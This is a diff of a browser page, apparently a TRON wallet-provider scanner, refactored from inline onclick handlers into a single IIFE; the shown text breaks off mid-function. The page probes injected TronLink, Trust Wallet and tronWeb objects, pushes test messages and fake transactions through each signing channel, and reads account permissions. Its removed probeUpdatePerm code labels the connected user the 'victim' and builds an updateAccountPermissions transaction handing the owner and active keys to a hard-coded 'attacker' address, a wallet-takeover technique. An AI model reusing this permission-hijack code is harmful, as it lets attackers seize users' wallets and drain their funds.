@@ -6,7 +6,7 @@
 <title>tron-surface — provider scanner</title>
 <style>
   :root{--bg:#0b0e13;--panel:#12161d;--line:#232a33;--txt:#c9d1d9;--dim:#6e7681;
-        --ok:#3fb950;--bad:#f85149;--warn:#d29922;--acc:#58a6ff;--mono:#8b949e}
+        --ok:#3fb950;--bad:#f85149;--warn:#d29922;--acc:#58a6ff}
   *{box-sizing:border-box}
   body{margin:0;font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
        background:var(--bg);color:var(--txt);padding:12px}
@@ -21,7 +21,7 @@
   button.bad{border-color:var(--bad);color:var(--bad)}
   .row{display:flex;gap:6px;flex-wrap:wrap;margin:4px 0}
   pre{background:#070a0e;border:1px solid var(--line);border-radius:4px;padding:8px;
-      margin:4px 0;overflow:auto;max-height:320px;white-space:pre-wrap;word-break:break-all;
+      margin:4px 0;overflow:auto;max-height:340px;white-space:pre-wrap;word-break:break-all;
       font-size:11px}
   .kv{display:grid;grid-template-columns:180px 1fr;gap:1px 10px;font-size:11px}
   .kv b{color:var(--dim);font-weight:400}
@@ -41,9 +41,9 @@
     <h1>tron-surface</h1>
     <div class="kv" id="env"></div>
     <div class="row" style="margin-top:8px">
-      <button class="acc" onclick="scanAll()">full scan</button>
-      <button onclick="dumpLog()">dump log</button>
-      <button onclick="clearLog()">clear</button>
+      <button class="acc" data-action="scanAll">full scan</button>
+      <button data-action="dumpLog">dump log</button>
+      <button data-action="clearLog">clear</button>
     </div>
   </div>
 
@@ -58,52 +58,52 @@
   <div class="panel">
     <h2>probes</h2>
     <div class="tabs" id="tabs">
-      <button class="on" data-t="t_identity" onclick="tab('t_identity')">identity</button>
-      <button data-t="t_connect" onclick="tab('t_connect')">connect</button>
-      <button data-t="t_sign" onclick="tab('t_sign')">sign</button>
-      <button data-t="t_perm" onclick="tab('t_perm')">permission</button>
-      <button data-t="t_rpc" onclick="tab('t_rpc')">rpc</button>
-      <button data-t="t_log" onclick="tab('t_log')">log</button>
+      <button class="on" data-tab="t_identity">identity</button>
+      <button data-tab="t_connect">connect</button>
+      <button data-tab="t_sign">sign</button>
+      <button data-tab="t_perm">permission</button>
+      <button data-tab="t_rpc">rpc</button>
+      <button data-tab="t_log">log</button>
     </div>
 
     <div class="sec on" id="t_identity">
       <div class="row">
-        <button onclick="probeIdentity()">scan provider identity</button>
-        <button onclick="probeDeep()">deep inspect (getOwnPropertyNames + proto)</button>
+        <button data-action="probeIdentity">scan provider identity</button>
+        <button data-action="probeDeep">deep inspect (proto + own)</button>
       </div>
       <pre id="o_identity">—</pre>
     </div>
 
     <div class="sec" id="t_connect">
       <div class="row">
-        <button class="acc" onclick="probeConnect('wS')">connect via wS (tronLink.tronWeb)</button>
-        <button onclick="probeConnect('Bt')">connect via Bt (window.tronWeb)</button>
-        <button onclick="probeMarkReady()">inspect markReady</button>
+        <button class="acc" data-action="probeConnectWS">connect via wS (tronLink.tronWeb)</button>
+        <button data-action="probeConnectBt">connect via Bt (window.tronWeb)</button>
+        <button data-action="probeMarkReady">inspect markReady</button>
       </div>
       <pre id="o_connect">—</pre>
     </div>
 
     <div class="sec" id="t_sign">
       <div class="row">
-        <button class="acc" onclick="probeSignChannel('wS')">sign via wS</button>
-        <button class="bad" onclick="probeSignChannel('Bt')">sign via Bt</button>
-        <button onclick="probeSignCompare()">compare sign functions</button>
+        <button class="acc" data-action="probeSignWS">sign via wS</button>
+        <button class="bad" data-action="probeSignBt">sign via Bt</button>
+        <button data-action="probeSignCompare">compare sign functions</button>
       </div>
       <pre id="o_sign">—</pre>
     </div>
 
     <div class="sec" id="t_perm">
       <div class="row">
-        <button onclick="probeOwnerVsActive()">owner vs active perms</button>
-        <button class="bad" onclick="probeUpdatePerm()">build updateAccountPermissions</button>
+        <button data-action="probeOwnerVsActive">owner vs active perms</button>
+        <button class="bad" data-action="probeUpdatePerm">build updateAccountPermissions</button>
       </div>
       <pre id="o_perm">—</pre>
     </div>
 
     <div class="sec" id="t_rpc">
       <div class="row">
-        <button onclick="probeEndpoints()">probe fullnode endpoints</button>
-        <button onclick="probeChain()">chain params</button>
+        <button data-action="probeEndpoints">probe fullnode endpoints</button>
+        <button data-action="probeChain">chain params</button>
       </div>
       <pre id="o_rpc">—</pre>
     </div>
@@ -116,332 +116,509 @@
 </div>
 
 <script>
-'use strict';
+(function () {
+  'use strict';
 
-/* ═══════════════════════════════════════════════════════════
-   tron-surface — provider scanner (fixed)
-   ═══════════════════════════════════════════════════════════ */
+  /* ═══════════════════════════════════════════════════════════
+     tron-surface — provider scanner
+     single IIFE, no globals, listeners attached via data-action
+     ═══════════════════════════════════════════════════════════ */
 
-const $ = id => document.getElementById(id);
-const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+  const $ = (id) => document.getElementById(id);
+  const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 
-let seq = 0;
-function log(kind, msg, data) {
-  const el = $('log');
-  if (!el) return;
-  const t = new Date().toISOString().slice(11,23);
-  const line = `[${t}] [${String(++seq).padStart(3,'0')}] ${kind.padEnd(8)} ${msg}`;
-  const body = data !== undefined ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ') : '';
-  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
-  el.scrollTop = el.scrollHeight;
-}
-function out(id, v) {
-  const el = $(id);
-  if (!el) return;
-  el.textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2);
-}
-function clearLog() { const el = $('log'); if (el) el.textContent = '—'; }
-function dumpLog() { if (navigator.clipboard) navigator.clipboard.writeText($('log').textContent); log('DUMP','copied'); }
-function tab(id) {
-  document.querySelectorAll('.sec').forEach(s => s.classList.toggle('on', s.id === id));
-  document.querySelectorAll('#tabs button').forEach(b => b.classList.toggle('on', b.dataset.t === id));
-}
-
-/* ── provider resolution ─────────────────────────────────── */
-
-function resolve() {
-  const out = { wS: null, Bt: null, names: [] };
-  if (window.tronLink?.tronWeb?.trx) { out.wS = window.tronLink.tronWeb; out.names.push('window.tronLink.tronWeb'); }
-  else if (window.trustwallet?.tron?.tronWeb?.trx) { out.wS = window.trustwallet.tron.tronWeb; out.names.push('window.trustwallet.tron.tronWeb'); }
-  else if (window.tron?.tronWeb?.trx) { out.wS = window.tron.tronWeb; out.names.push('window.tron.tronWeb'); }
-  if (window.tronWeb?.trx && window.tronWeb !== out.wS) { out.Bt = window.tronWeb; out.names.push('window.tronWeb'); }
-  return out;
-}
-
-function fnSrc(f) {
-  if (typeof f !== 'function') return null;
-  try { return f.toString().replace(/\s+/g,' ').slice(0, 240); } catch { return '[native]'; }
-}
-
-/* ── identity ────────────────────────────────────────────── */
-
-function probeIdentity() {
-  log('IDENT', 'scan start');
-  const r = resolve();
-  const wS = r.wS, Bt = r.Bt;
-  const summary = {
-    resolved: r.names,
-    wS: wS ? {
-      version: wS.version, ready: wS.ready,
-      defaultAddress: wS.defaultAddress?.base58 || false,
-      hasSignMessageV2: typeof wS.trx?.signMessageV2 === 'function',
-      hasSign: typeof wS.trx?.sign === 'function',
-      hasRequest: typeof wS.request === 'function',
-      hasMarkReady: typeof wS.markReady === 'function',
-    } : null,
-    Bt: Bt ? {
-      version: Bt.version, ready: Bt.ready,
-      defaultAddress: Bt.defaultAddress?.base58 || false,
-      hasSignMessageV2: typeof Bt.trx?.signMessageV2 === 'function',
-      hasSign: typeof Bt.trx?.sign === 'function',
-      hasRequest: typeof Bt.request === 'function',
-    } : null,
-    sameObject: wS === Bt,
-  };
-  out('o_identity', summary);
-  log('IDENT', 'summary', summary);
-}
-
-function probeDeep() {
-  log('DEEP', 'inspect proto chains');
-  const r = resolve();
-  function dump(obj, name) {
-    if (!obj) return { name, exists: false };
-    const own = Object.getOwnPropertyNames(obj);
-    const proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
-    const methods = proto.filter(k => { try { return typeof obj[k] === 'function'; } catch { return false; } });
-    return { name, own, proto, methods, ctor: obj.constructor?.name };
+  let seq = 0;
+  function log(kind, msg, data) {
+    const el = $('log');
+    if (!el) return;
+    const t = new Date().toISOString().slice(11, 23);
+    const line = `[${t}] [${String(++seq).padStart(3, '0')}] ${kind.padEnd(8)} ${msg}`;
+    const body = data !== undefined
+      ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ')
+      : '';
+    el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
+    el.scrollTop = el.scrollHeight;
   }
-  const res = {
-    wS: dump(r.wS, 'wS'),
-    wS_trx: r.wS?.trx ? dump(r.wS.trx, 'wS.trx') : null,
-    Bt: dump(r.Bt, 'Bt'),
-    Bt_trx: r.Bt?.trx ? dump(r.Bt.trx, 'Bt.trx') : null,
-  };
-  out('o_identity', res);
-  log('DEEP', 'done', { wS_ctor: res.wS?.ctor, Bt_ctor: res.Bt?.ctor });
-}
 
-/* ── connect ─────────────────────────────────────────────── */
-
-function snap(t) {
-  return {
-    ready: t.ready,
-    defaultAddress: t.defaultAddress?.base58 || false,
-    tronWebReady: t.tronWeb?.ready,
-    tronWebDefaultAddress: t.tronWeb?.defaultAddress?.base58 || false,
-  };
-}
-
-async function probeConnect(which) {
-  const r = resolve();
-  const target = which === 'wS' ? r.wS : r.Bt;
-  if (!target) { out('o_connect', which + ' not found'); return; }
-  const rec = { which, before: snap(target) };
-  log('CONNECT', which + ' start', rec.before);
-  const paths = [];
-  if (typeof target.request === 'function') {
-    try { const a = await target.request({ method: 'tron_requestAccounts' }); paths.push({ method: 'tron_requestAccounts', ok: true, result: a }); }
-    catch (e) { paths.push({ method: 'tron_requestAccounts', ok: false, err: e.message }); }
-    try { const a = await target.request({ method: 'eth_requestAccounts' }); paths.push({ method: 'eth_requestAccounts', ok: true, result: a }); }
-    catch (e) { paths.push({ method: 'eth_requestAccounts', ok: false, err: e.message }); }
+  function out(id, v) {
+    const el = $(id);
+    if (!el) return;
+    el.textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2);
   }
-  if (typeof target.connect === 'function') {
-    try { const a = await target.connect(); paths.push({ method: 'connect', ok: true, result: a }); }
-    catch (e) { paths.push({ method: 'connect', ok: false, err: e.message }); }
+
+  function clearLog() {
+    const el = $('log');
+    if (el) el.textContent = '—';
+    seq = 0;
   }
-  const t0 = Date.now();
-  while (Date.now() - t0 < 3000 && !target.defaultAddress?.base58 && !target.tronWeb?.defaultAddress?.base58) {
-    await new Promise(r => setTimeout(r, 150));
+
+  function dumpLog() {
+    const el = $('log');
+    if (el && navigator.clipboard) navigator.clipboard.writeText(el.textContent);
+    log('DUMP', 'copied to clipboard');
   }
-  rec.paths = paths;
-  rec.after = snap(target);
-  out('o_connect', rec);
-  log('CONNECT', which + ' done', { after: rec.after });
-}
 
-function probeMarkReady() {
-  const r = resolve();
-  const wS = r.wS;
-  if (!wS) { out('o_connect', 'wS not found'); return; }
-  const info = {
-    hasMarkReady: typeof wS.markReady === 'function',
-    markReadySrc: fnSrc(wS.markReady),
-    hasSendResponse: typeof wS.sendResponse === 'function',
-    hasSendError: typeof wS.sendError === 'function',
-  };
-  out('o_connect', info);
-  log('MARKREADY', 'inspect', info);
-}
-
-/* ── sign ────────────────────────────────────────────────── */
-
-async function probeSignChannel(which) {
-  const r = resolve();
-  const target = which === 'wS' ? r.wS : r.Bt;
-  if (!target) { out('o_sign', which + ' not found'); return; }
-  const rec = { which, hasSign: typeof target.trx?.sign === 'function', hasSignMessageV2: typeof target.trx?.signMessageV2 === 'function' };
-  if (rec.hasSignMessageV2) {
-    try { const msg = 'tron-surface probe ' + Date.now(); rec.msg = msg; rec.signMessageV2 = { ok: true, sig: await target.trx.signMessageV2(msg) }; }
-    catch (e) { rec.signMessageV2 = { ok: false, code: e.code, message: e.message }; }
+  function tab(id) {
+    document.querySelectorAll('.sec').forEach(s => s.classList.toggle('on', s.id === id));
+    document.querySelectorAll('#tabs button').forEach(b => b.classList.toggle('on', b.dataset.tab === id));
   }
-  if (rec.hasSign) {
-    try {
-      const fakeTx = { visible: true, txID: '00'.repeat(32), raw_data: { contract: [] }, raw_data_hex: '' };
-      rec.fakeTx = fakeTx;
-      rec.sign = { ok: true, signed: await target.trx.sign(fakeTx) };
-    } catch (e) { rec.sign = { ok: false, code: e.code, message: e.message }; }
+
+  /* ── provider resolution ─────────────────────────────── */
+
+  function resolve() {
+    const r = { wS: null, Bt: null, names: [] };
+    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.trx) {
+      r.wS = window.tronLink.tronWeb;
+      r.names.push('window.tronLink.tronWeb');
+    } else if (window.trustwallet && window.trustwallet.tron && window.trustwallet.tron.tronWeb && window.trustwallet.tron.tronWeb.trx) {
+      r.wS = window.trustwallet.tron.tronWeb;
+      r.names.push('window.trustwallet.tron.tronWeb');
+    } else if (window.tron && window.tron.tronWeb && window.tron.tronWeb.trx) {
+      r.wS = window.tron.tronWeb;
+      r.names.push('window.tron.tronWeb');
+    }
+    if (window.tronWeb && window.tronWeb.trx && window.tronWeb !== r.wS) {
+      r.Bt = window.tronWeb;
+      r.names.push('window.tronWeb');
+    }
+    return r;
   }
-  out('o_sign', rec);
-  log('SIGN', which, rec);
-}
 
-function probeSignCompare() {
-  const r = resolve();
-  if (!r.wS || !r.Bt) { out('o_sign', 'need both wS and Bt'); return; }
-  const cmp = {
-    signSame: r.wS.trx.sign === r.Bt.trx.sign,
-    signMessageV2Same: r.wS.trx.signMessageV2 === r.Bt.trx.signMessageV2,
-    wS_sign_src: fnSrc(r.wS.trx.sign),
-    Bt_sign_src: fnSrc(r.Bt.trx.sign),
-    wS_signMessageV2_src: fnSrc(r.wS.trx.signMessageV2),
-    Bt_signMessageV2_src: fnSrc(r.Bt.trx.signMessageV2),
-  };
-  out('o_sign', cmp);
-  log('SIGN', 'compare', { same: cmp.signSame, v2same: cmp.signMessageV2Same });
-}
+  function fnSrc(f) {
+    if (typeof f !== 'function') return null;
+    try { return f.toString().replace(/\s+/g, ' ').slice(0, 240); }
+    catch (e) { return '[native]'; }
+  }
 
-/* ── permission ──────────────────────────────────────────── */
-
-async function probeOwnerVsActive() {
-  const r = resolve();
-  const wS = r.wS;
-  if (!wS) { out('o_perm', 'wS not found'); return; }
-  const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
-  if (!addr) { out('o_perm', 'no address connected — connect first'); log('PERM','no address'); return; }
-  try {
-    const account = await wS.trx.getAccount(addr);
-    const perms = (account.permissions || []).map(p => ({
-      name: p.permission_name, type: p.type, threshold: p.threshold,
-      keys: (p.keys || []).map(k => ({ address: k.address, weight: k.weight })), id: p.id,
-    }));
-    const owner = perms.find(p => p.type === 0 || p.name === 'owner');
-    const active = perms.find(p => p.type === 2 || p.name === 'active');
-    out('o_perm', { addr, owner, active, raw_permissions: perms });
-    log('PERM', 'owner vs active', { owner, active });
-  } catch (e) { out('o_perm', { error: e.message }); log('PERM', 'getAccount failed', { message: e.message }); }
-}
-
-async function probeUpdatePerm() {
-  const r = resolve();
-  const wS = r.wS;
-  if (!wS) { out('o_perm', 'wS not found'); return; }
-  const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
-  if (!addr) { out('o_perm', 'no address — connect first'); return; }
-  try {
-    const builder = wS.transactionBuilder || r.Bt?.transactionBuilder;
-    if (!builder?.updateAccountPermissions) { out('o_perm', 'no updateAccountPermissions on builder'); return; }
-    const victim = addr;
-    const attacker = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW';
-    const perm = {
-      owner: { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: attacker, weight: 1 }] },
-      active: [{ type: 2, permission_name: 'active', threshold: 1, keys: [{ address: attacker, weight: 1 }] }],
-      owner_address: victim,
+  function snap(t) {
+    return {
+      ready: t.ready,
+      defaultAddress: (t.defaultAddress && t.defaultAddress.base58) || false,
+      tronWebReady: t.tronWeb && t.tronWeb.ready,
+      tronWebDefaultAddress: (t.tronWeb && t.tronWeb.defaultAddress && t.tronWeb.defaultAddress.base58) || false,
     };
-    log('PERM', 'building updateAccountPermissions', { victim, attacker });
-    const tx = await builder.updateAccountPermissions(perm);
-    log('PERM', 'tx built', { txID: tx.txID });
-    out('o_perm', { step: 'built', tx, note: 'NOT signed — inspect only' });
-  } catch (e) { out('o_perm', { step: 'build failed', message: e.message }); log('PERM', 'build failed', { message: e.message }); }
-}
+  }
 
-/* ── rpc ─────────────────────────────────────────────────── */
+  /* ── identity ────────────────────────────────────────── */
 
-async function probeEndpoints() {
-  const r = resolve();
-  const bt = r.Bt || r.wS;
-  if (!bt) { out('o_rpc', 'no tronWeb'); return; }
-  const eps = { fullNode: bt.fullNode?.host || '—', solidityNode: bt.solidityNode?.host || '—', eventServer: bt.eventServer?.host || '—' };
-  const results = { endpoints: eps, probes: [] };
-  try { const t = performance.now(); const info = await bt.trx.getNodeInfo(); results.probes.push({ rpc: 'getNodeInfo', ok: true, ms: Math.round(performance.now()-t), keys: Object.keys(info).slice(0,8) }); }
-  catch (e) { results.probes.push({ rpc: 'getNodeInfo', ok: false, err: e.message }); }
-  try { const t = performance.now(); const block = await bt.trx.getCurrentBlock(); results.probes.push({ rpc: 'getCurrentBlock', ok: true, ms: Math.round(performance.now()-t), num: block.block_header?.raw_data?.number }); }
-  catch (e) { results.probes.push({ rpc: 'getCurrentBlock', ok: false, err: e.message }); }
-  out('o_rpc', results);
-  log('RPC', 'endpoints', results);
-}
+  function probeIdentity() {
+    log('IDENT', 'scan start');
+    const r = resolve();
+    const wS = r.wS, Bt = r.Bt;
+    const summary = {
+      resolved: r.names,
+      wS: wS ? {
+        version: wS.version,
+        ready: wS.ready,
+        defaultAddress: (wS.defaultAddress && wS.defaultAddress.base58) || false,
+        hasSignMessageV2: typeof (wS.trx && wS.trx.signMessageV2) === 'function',
+        hasSign: typeof (wS.trx && wS.trx.sign) === 'function',
+        hasRequest: typeof wS.request === 'function',
+        hasMarkReady: typeof wS.markReady === 'function',
+      } : null,
+      Bt: Bt ? {
+        version: Bt.version,
+        ready: Bt.ready,
+        defaultAddress: (Bt.defaultAddress && Bt.defaultAddress.base58) || false,
+        hasSignMessageV2: typeof (Bt.trx && Bt.trx.signMessageV2) === 'function',
+        hasSign: typeof (Bt.trx && Bt.trx.sign) === 'function',
+        hasRequest: typeof Bt.request === 'function',
+      } : null,
+      sameObject: wS === Bt,
+    };
+    out('o_identity', summary);
+    log('IDENT', 'summary', summary);
+  }
 
-async function probeChain() {
-  const r = resolve();
-  const bt = r.Bt || r.wS;
-  if (!bt) { out('o_rpc', 'no tronWeb'); return; }
-  try { const params = await bt.trx.getChainParameters(); out('o_rpc', params); log('CHAIN','params',{ count: params.length }); }
-  catch (e) { out('o_rpc', { err: e.message }); }
-}
+  function probeDeep() {
+    log('DEEP', 'inspect proto chains');
+    const r = resolve();
+    function dump(obj, name) {
+      if (!obj) return { name: name, exists: false };
+      const own = Object.getOwnPropertyNames(obj);
+      const proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
+      const methods = proto.filter(function (k) {
+        try { return typeof obj[k] === 'function'; } catch (e) { return false; }
+      });
+      return {
+        name: name,
+        own: own,
+        proto: proto,
+        methods: methods,
+        ctor: obj.constructor && obj.constructor.name,
+      };
+    }
+    const res = {
+      wS: dump(r.wS, 'wS'),
+      wS_trx: (r.wS && r.wS.trx) ? dump(r.wS.trx, 'wS.trx') : null,
+      Bt: dump(r.Bt, 'Bt'),
+      Bt_trx: (r.Bt && r.Bt.trx) ? dump(r.Bt.trx, 'Bt.trx') : null,
+    };
+    out('o_identity', res);
+    log('DEEP', 'done', { wS_ctor: res.wS && res.wS.ctor, Bt_ctor: res.Bt && res.Bt.ctor });
+  }
 
-/* ── master scan ─────────────────────────────────────────── */
+  /* ── connect ─────────────────────────────────────────── */
 
-async function scanAll() {
-  log('SCAN', '=== full scan start ===');
-  try { probeIdentity(); } catch (e) { log('SCAN', 'identity error', { message: e.message }); }
-  try { probeDeep(); } catch (e) { log('SCAN', 'deep error', { message: e.message }); }
-  try { await probeConnect('wS'); } catch (e) { log('SCAN', 'connect wS error', { message: e.message }); }
-  try { probeSignCompare(); } catch (e) { log('SCAN', 'sign compare error', { message: e.message }); }
-  try { await probeOwnerVsActive(); } catch (e) { log('SCAN', 'owner/active error', { message: e.message }); }
-  try { await probeEndpoints(); } catch (e) { log('SCAN', 'endpoints error', { message: e.message }); }
-  log('SCAN', '=== full scan done ===');
-}
+  async function probeConnect(which) {
+    const r = resolve();
+    const target = which === 'wS' ? r.wS : r.Bt;
+    if (!target) { out('o_connect', which + ' not found'); return; }
 
-/* ── boot ────────────────────────────────────────────────── */
+    const rec = { which: which, before: snap(target) };
+    log('CONNECT', which + ' start', rec.before);
 
-function boot() {
-  const r = resolve();
-  const hasEthereum = !!window.ethereum;
-  $('env').innerHTML = `
-    <b>origin</b><span>${esc(location.origin)}</span>
-    <b>UA</b><span style="font-size:10px">${esc(navigator.userAgent)}</span>
-    <b>window.tron</b><span class="${window.tron?'ok':'bad'}">${window.tron ? 'present' : 'absent'}</span>
-    <b>window.tronLink</b><span class="${window.tronLink?'ok':'bad'}">${window.tronLink ? 'present' : 'absent'}</span>
-    <b>trustwallet.tron</b><span class="${window.trustwallet?.tron?'ok':'bad'}">${window.trustwallet?.tron ? 'present' : 'absent'}</span>
-    <b>window.tronWeb</b><span class="${window.tronWeb?'ok':'bad'}">${window.tronWeb ? 'present' : 'absent'}</span>
-    <b>window.ethereum</b><span class="${hasEthereum?'ok':'bad'}">${hasEthereum ? 'present' : 'absent'}</span>
-    <b>resolved wS</b><span class="${r.wS?'ok':'bad'}">${r.wS ? r.names.filter(n=>n!=='window.tronWeb').join(', ') : 'none'}</span>
-    <b>resolved Bt</b><span class="${r.Bt?'ok':'bad'}">${r.Bt ? 'window.tronWeb' : 'none'}</span>
-  `;
-  $('ch_ws').innerHTML = r.wS ? `
-    <b>instance</b><span class="acc">wS (bridge)</span>
-    <b>version</b><span>${esc(r.wS.version || '—')}</span>
-    <b>ready</b><span class="${r.wS.ready?'ok':'warn'}">${r.wS.ready}</span>
-    <b>defaultAddress</b><span>${r.wS.defaultAddress?.base58 || r.wS.tronWeb?.defaultAddress?.base58 || '—'}</span>
-    <b>trx.sign</b><span class="${typeof r.wS.trx?.sign==='function'?'ok':'bad'}">${typeof r.wS.trx?.sign}</span>
-    <b>trx.signMessageV2</b><span class="${typeof r.wS.trx?.signMessageV2==='function'?'ok':'bad'}">${typeof r.wS.trx?.signMessageV2}</span>
-    <b>request</b><span class="${typeof r.wS.request==='function'?'ok':'bad'}">${typeof r.wS.request}</span>
-    <b>markReady</b><span class="${typeof r.wS.markReady==='function'?'ok':'bad'}">${typeof r.wS.markReady}</span>
-  ` : '<b>wS</b><span class="bad">not resolved</span>';
-  $('ch_bt').innerHTML = r.Bt ? `
-    <b>instance</b><span class="warn">Bt (fullnode)</span>
-    <b>version</b><span>${esc(r.Bt.version || '—')}</span>
-    <b>ready</b><span>${r.Bt.ready ?? '—'}</span>
-    <b>defaultAddress</b><span>${r.Bt.defaultAddress?.base58 || '—'}</span>
-    <b>trx.sign</b><span class="${typeof r.Bt.trx?.sign==='function'?'ok':'bad'}">${typeof r.Bt.trx?.sign}</span>
-    <b>trx.signMessageV2</b><span class="${typeof r.Bt.trx?.signMessageV2==='function'?'ok':'bad'}">${typeof r.Bt.trx?.signMessageV2}</span>
-    <b>fullNode</b><span style="font-size:10px">${esc(r.Bt.fullNode?.host || '—')}</span>
-  ` : '<b>Bt</b><span class="warn">not resolved</span>';
-  log('BOOT', 'tron-surface up', { origin: location.origin, wS: !!r.wS, Bt: !!r.Bt });
-}
+    const paths = [];
 
-/* expose to window for onclick */
-window.scanAll = scanAll;
-window.probeIdentity = probeIdentity;
-window.probeDeep = probeDeep;
-window.probeConnect = probeConnect;
-window.probeMarkReady = probeMarkReady;
-window.probeSignChannel = probeSignChannel;
-window.probeSignCompare = probeSignCompare;
-window.probeOwnerVsActive = probeOwnerVsActive;
-window.probeUpdatePerm = probeUpdatePerm;
-window.probeEndpoints = probeEndpoints;
-window.probeChain = probeChain;
-window.tab = tab;
-window.clearLog = clearLog;
-window.dumpLog = dumpLog;
+    if (typeof target.request === 'function') {
+      try {
+        const a = await target.request({ method: 'tron_requestAccounts' });
+        paths.push({ method: 'tron_requestAccounts', ok: true, result: a });
+      } catch (e) {
+        paths.push({ method: 'tron_requestAccounts', ok: false, err: e.message });
+      }
+      try {
+        const a = await target.request({ method: 'eth_requestAccounts' });
+        paths.push({ method: 'eth_requestAccounts', ok: true, result: a });
+      } catch (e) {
+        paths.push({ method: 'eth_requestAccounts', ok: false, err: e.message });
+      }
+    }
 
-/* run boot after DOM ready */
-if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', boot);
-} else {
-  boot();
-}
+    if (typeof target.connect === 'function') {
+      try {
+        const a = await target.connect();
+        paths.push({ method: 'connect', ok: true, result: a });
+      } catch (e) {
+        paths.push({ method: 'connect', ok: false, err: e.message });
+      }
+    }
+
+    const t0 = Date.now();
+    while (Date.now() - t0 < 3000) {
+      const hasAddr =
+        (target.defaultAddress && target.defaultAddress.base58) ||
+        (target.tronWeb && target.tronWeb.defaultAddress && target.tronWeb.defaultAddress.base58);
+      if (hasAddr) break;
+      await new Promise(function (r) { setTimeout(r, 150); });
+    }
+
+    rec.paths = paths;
+    rec.after = snap(target);
+    out('o_connect', rec);
+    log('CONNECT', which + ' done', { after: rec.after });
+  }
+
+  function probeConnectWS() { return probeConnect('wS'); }
+  function probeConnectBt() { return probeConnect('Bt'); }
+
+  function probeMarkReady() {
+    const r = resolve();
+    const wS = r.wS;
+    if (!wS) { out('o_connect', 'wS not found'); return; }
+    const info = {
+      hasMarkReady: typeof wS.markReady === 'function',
+      markReadySrc: fnSrc(wS.markReady),
+      hasSendResponse: typeof wS.sendResponse === 'function',
+      hasSendError: typeof wS.sendError === 'function',
+    };
+    out('o_connect', info);
+    log('MARKREADY', 'inspect', info);
+  }
+
+  /* ── sign ────────────────────────────────────────────── */
+
+  async function probeSignChannel(which) {
+    const r = resolve();
+    const target = which === 'wS' ? r.wS : r.Bt;
+    if (!target) { out('o_sign', which + ' not found'); return; }
+
+    const rec = {
+      which: which,
+      hasSign: typeof (target.trx && target.trx.sign) === 'function',
+      hasSignMessageV2: typeof (target.trx && target.trx.signMessageV2) === 'function',
+    };
+
+    if (rec.hasSignMessageV2) {
+      try {
+        const msg = 'tron-surface probe ' + Date.now();
+        rec.msg = msg;
+        rec.signMessageV2 = { ok: true, sig: await target.trx.signMessageV2(msg) };
+      } catch (e) {
+        rec.signMessageV2 = { ok: false, code: e.code, message: e.message };
+      }
+    }
+
+    if (rec.hasSign) {
+      try {
+        const fakeTx = { visible: true, txID: '00'.repeat(32), raw_data: { contract: [] }, raw_data_hex: '' };
+        rec.fakeTx = fakeTx;
+        rec.sign = { ok: true, signed: await target.trx.sign(fakeTx) };
+      } catch (e) {
+        rec.sign = { ok: false, code: e.code, message: e.message };
+      }
+    }
+
+    out('o_sign', rec);
+    log('SIGN', which, rec);
+  }
+
+  function probeSignWS() { return probeSignChannel('wS'); }
+  function probeSignBt() { return probeSignChannel('Bt'); }
+
+  function probeSignCompare() {
+    const r = resolve();
+    if (!r.wS || !r.Bt) { out('o_sign', 'need both wS and Bt'); return; }
+    const cmp = {
+      signSame: (r.wS.trx && r.Bt.trx) ? (r.wS.trx.sign === r.Bt.trx.sign) : null,
+      signMessageV2Same: (r.wS.trx && r.Bt.trx) ? (r.wS.trx.signMessageV2 === r.Bt.trx.signMessageV2) : null,
+      wS_sign_src: r.wS.trx ? fnSrc(r.wS.trx.sign) : null,
+      Bt_sign_src: r.Bt.trx ? fnSrc(r.Bt.trx.sign) : null,
+      wS_signMessageV2_src: r.wS.trx ? fnSrc(r.wS.trx.signMessageV2) : null,
+      Bt_signMessageV2_src: r.Bt.trx ? fnSrc(r.Bt.trx.signMessageV2) : null,
+    };
+    out('o_sign', cmp);
+    log('SIGN', 'compare', { same: cmp.signSame, v2same: cmp.signMessageV2Same });
+  }
+
+  /* ── permission ──────────────────────────────────────── */
+
+  async function probeOwnerVsActive() {
+    const r = resolve();
+    const wS = r.wS;
+    if (!wS) { out('o_perm', 'wS not found'); return; }
+    const addr = (wS.defaultAddress && wS.defaultAddress.base58) ||
+                 (wS.tronWeb && wS.tronWeb.defaultAddress && wS.tronWeb.defaultAddress.base58);
+    if (!addr) { out('o_perm', 'no address connected — connect first'); log('PERM', 'no address'); return; }
+
+    try {
+      const account = await wS.trx.getAccount(addr);
+      const perms = (account.permissions || []).map(function (p) {
+        return {
+          name: p.permission_name,
+          type: p.type,
+          threshold: p.threshold,
+          keys: (p.keys || []).map(function (k) { return { address: k.address, weight: k.weight }; }),
+          id: p.id,
+        };
+      });
+      const owner = perms.find(function (p) { return p.type === 0 || p.name === 'owner'; });
+      const active = perms.find(function (p) { return p.type === 2 || p.name === 'active'; });
+      out('o_perm', { addr: addr, owner: owner, active: active, raw_permissions: perms });
+      log('PERM', 'owner vs active', { owner: owner, active: active });
+    } catch (e) {
+      out('o_perm', { error: e.message });
+      log('PERM', 'getAccount failed', { message: e.message });
+    }
+  }
+
+  async function probeUpdatePerm() {
+    const r = resolve();
+    const wS = r.wS;
+    if (!wS) { out('o_perm', 'wS not found'); return; }
+    const addr = (wS.defaultAddress && wS.defaultAddress.base58) ||
+                 (wS.tronWeb && wS.tronWeb.defaultAddress && wS.tronWeb.defaultAddress.base58);
+    if (!addr) { out('o_perm', 'no address — connect first'); return; }
+
+    try {
